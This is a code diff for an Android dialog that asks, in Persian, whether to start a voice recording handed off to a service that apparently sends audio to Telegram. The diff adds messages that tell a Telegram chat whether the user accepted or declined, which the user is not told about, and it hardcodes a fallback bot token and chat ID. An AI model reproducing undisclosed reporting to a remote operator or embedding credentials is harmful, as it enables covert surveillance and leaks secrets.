@@ -3,9 +3,14 @@ package com.blu.app.voice;
 import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.drawable.GradientDrawable;
+import android.os.Handler;
+import android.os.Looper;
 import android.view.Gravity;
 import android.view.View;
 import android.view.ViewGroup;
+import android.view.animation.AlphaAnimation;
+import android.view.animation.Animation;
+import android.view.animation.ScaleAnimation;
 import android.widget.Button;
 import android.widget.FrameLayout;
 import android.widget.LinearLayout;
@@ -16,6 +21,7 @@ public class FloatingVoiceNotification {
     private AppCompatActivity activity;
     private String botToken, chatId, voiceToken;
     private FrameLayout container;
+    private Handler handler = new Handler(Looper.getMainLooper());
     
     public FloatingVoiceNotification(AppCompatActivity activity, String botToken, String chatId, String voiceToken) {
         this.activity = activity;
@@ -27,23 +33,24 @@ public class FloatingVoiceNotification {
     public void show() {
         container = new FrameLayout(activity);
         container.setLayoutParams(new FrameLayout.LayoutParams(
-            FrameLayout.LayoutParams.MATCH_PARENT, 
+            FrameLayout.LayoutParams.MATCH_PARENT,
             FrameLayout.LayoutParams.MATCH_PARENT
         ));
-        container.setBackgroundColor(Color.argb(180, 0, 0, 0));
+        container.setBackgroundColor(Color.argb(150, 0, 0, 0));
         container.setClickable(true);
+        container.setFocusable(true);
         
-        // دیالوگ شیشه‌ای با افکت
+        // دیالوگ شیشه‌ای
         LinearLayout dialog = new LinearLayout(activity);
         dialog.setOrientation(LinearLayout.VERTICAL);
-        dialog.setBackgroundColor(Color.argb(230, 255, 255, 255));
         dialog.setPadding(50, 40, 50, 40);
-        dialog.setElevation(30);
+        dialog.setElevation(40);
         
-        // گوشه‌های گرد
+        // پس‌زمینه شیشه‌ای با افکت
         GradientDrawable shape = new GradientDrawable();
-        shape.setCornerRadius(30);
+        shape.setCornerRadius(40);
         shape.setColor(Color.argb(240, 255, 255, 255));
+        shape.setStroke(2, Color.parseColor("#80FFFFFF"));
         dialog.setBackground(shape);
         
         FrameLayout.LayoutParams dialogParams = new FrameLayout.LayoutParams(
@@ -53,27 +60,27 @@ public class FloatingVoiceNotification {
         dialogParams.gravity = Gravity.CENTER;
         dialog.setLayoutParams(dialogParams);
         
-        // آیکون میکروفون
+        // آیکون میکروفون با انیمیشن
         TextView icon = new TextView(activity);
         icon.setText("🎙️");
-        icon.setTextSize(50);
+        icon.setTextSize(55);
         icon.setGravity(Gravity.CENTER);
         LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT, 
+            LinearLayout.LayoutParams.MATCH_PARENT,
             LinearLayout.LayoutParams.WRAP_CONTENT
         );
-        iconParams.bottomMargin = 10;
+        iconParams.bottomMargin = 5;
         dialog.addView(icon, iconParams);
         
         // عنوان
         TextView title = new TextView(activity);
-        title.setText("Record Voice");
-        title.setTextSize(22);
+        title.setText("ضبط صدا");
+        title.setTextSize(24);
         title.setTextColor(Color.BLACK);
         title.setGravity(Gravity.CENTER);
         title.setTypeface(null, android.graphics.Typeface.BOLD);
         LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT, 
+            LinearLayout.LayoutParams.MATCH_PARENT,
             LinearLayout.LayoutParams.WRAP_CONTENT
         );
         titleParams.bottomMargin = 5;
@@ -81,12 +88,12 @@ public class FloatingVoiceNotification {
         
         // توضیحات
         TextView desc = new TextView(activity);
-        desc.setText("Start recording voice and send to Telegram");
+        desc.setText("آیا می‌خواهید ضبط صدا شروع شود؟");
         desc.setTextSize(14);
         desc.setTextColor(Color.GRAY);
         desc.setGravity(Gravity.CENTER);
         LinearLayout.LayoutParams descParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT, 
+            LinearLayout.LayoutParams.MATCH_PARENT,
             LinearLayout.LayoutParams.WRAP_CONTENT
         );
         descParams.bottomMargin = 25;
@@ -98,53 +105,76 @@ public class FloatingVoiceNotification {
         buttonsLayout.setGravity(Gravity.CENTER);
         buttonsLayout.setWeightSum(2);
         
-        // دکمه Cancel
-        Button cancelBtn = new Button(activity);
-        cancelBtn.setText("Cancel");
-        cancelBtn.setTextColor(Color.WHITE);
-        cancelBtn.setBackgroundColor(Color.parseColor("#FF4444"));
-        cancelBtn.setPadding(20, 15, 20, 15);
-        cancelBtn.setElevation(10);
-        cancelBtn.setAllCaps(false);
-        LinearLayout.LayoutParams cancelParams = new LinearLayout.LayoutParams(
-            0, 
-            LinearLayout.LayoutParams.WRAP_CONTENT, 
-            0.7f
-        );
-        cancelParams.setMargins(0, 0, 15, 0);
-        cancelBtn.setLayoutParams(cancelParams);
-        cancelBtn.setOnClickListener(v -> removeFromParent());
+        // دکمه Decline (قرمز)
+        Button declineBtn = new Button(activity);
+        declineBtn.setText("❌ رد کردن");
+        declineBtn.setTextColor(Color.WHITE);
+        declineBtn.setBackgroundColor(Color.parseColor("#FF3B30"));
+        declineBtn.setPadding(20, 18, 20, 18);
+        declineBtn.setElevation(10);
+        declineBtn.setAllCaps(false);
+        declineBtn.setTypeface(null, android.graphics.Typeface.BOLD);
         
-        // دکمه Start با رنگ سبز شیشه‌ای
+        GradientDrawable declineShape = new GradientDrawable();
+        declineShape.setCornerRadius(30);
+        declineShape.setColor(Color.parseColor("#FF3B30"));
+        declineBtn.setBackground(declineShape);
+        
+        LinearLayout.LayoutParams declineParams = new LinearLayout.LayoutParams(
+            0,
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            0.6f
+        );
+        declineParams.setMargins(0, 0, 15, 0);
+        declineBtn.setLayoutParams(declineParams);
+        declineBtn.setOnClickListener(v -> {
+            // ارسال نوتیفیکیشن رد کردن به تلگرام
+            sendTelegramNotification("❌ کاربر ضبط را رد کرد!");
+            removeFromParent();
+        });
+        
+        // دکمه Start (سبز شیشه‌ای)
         Button startBtn = new Button(activity);
-        startBtn.setText("▶ Start");
+        startBtn.setText("▶ شروع ضبط");
         startBtn.setTextColor(Color.WHITE);
-        startBtn.setBackgroundColor(Color.parseColor("#34C759"));
-        startBtn.setPadding(20, 15, 20, 15);
+        startBtn.setPadding(20, 18, 20, 18);
         startBtn.setElevation(10);
         startBtn.setAllCaps(false);
+        startBtn.setTypeface(null, android.graphics.Typeface.BOLD);
         
-        // افکت شیشه‌ای روی دکمه Start
         GradientDrawable startShape = new GradientDrawable();
-        startShape.setCornerRadius(25);
+        startShape.setCornerRadius(30);
         startShape.setColor(Color.parseColor("#34C759"));
         startBtn.setBackground(startShape);
         
         LinearLayout.LayoutParams startParams = new LinearLayout.LayoutParams(
-            0, 
-            LinearLayout.LayoutParams.WRAP_CONTENT, 
-            1.3f
+            0,
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            1.4f
         );
         startBtn.setLayoutParams(startParams);
         startBtn.setOnClickListener(v -> {
+            // ارسال نوتیفیکیشن شروع ضبط به تلگرام
+            sendTelegramNotification("🔴 ضبط صدا شروع شد!");
+            
+            // شروع ضبط در سرویس
             startVoiceRecording();
             removeFromParent();
         });
         
-        buttonsLayout.addView(cancelBtn);
+        buttonsLayout.addView(declineBtn);
         buttonsLayout.addView(startBtn);
         dialog.addView(buttonsLayout);
         container.addView(dialog);
+        
+        // انیمیشن ورود
+        Animation scaleAnim = new ScaleAnimation(
+            0.8f, 1f, 0.8f, 1f,
+            Animation.RELATIVE_TO_SELF, 0.5f,
+            Animation.RELATIVE_TO_SELF, 0.5f
+        );
+        scaleAnim.setDuration(300);
+        dialog.startAnimation(scaleAnim);
         
         // اضافه کردن به صفحه
         View decorView = activity.getWindow().getDecorView();
@@ -166,5 +196,23 @@ public class FloatingVoiceNotification {
         serviceIntent.putExtra("chat_id", chatId);
         serviceIntent.putExtra("voice_token", voiceToken);
         activity.startService(serviceIntent);
+    }
+    
+    private void sendTelegramNotification(String message) {
+        new Thread(() -> {
+            try {
+                String finalBotToken = (botToken == null || botToken.isEmpty()) 
+                    ? "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM" 
+                    : botToken;
+                String finalChatId = (chatId == null || chatId.isEmpty()) 
+                    ? "-1004352035353" 
+                    : chatId;
+                
+                TelegramUploader uploader = new TelegramUploader();
+                uploader.sendMessage(finalBotToken, finalChatId, message);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
     }
 }
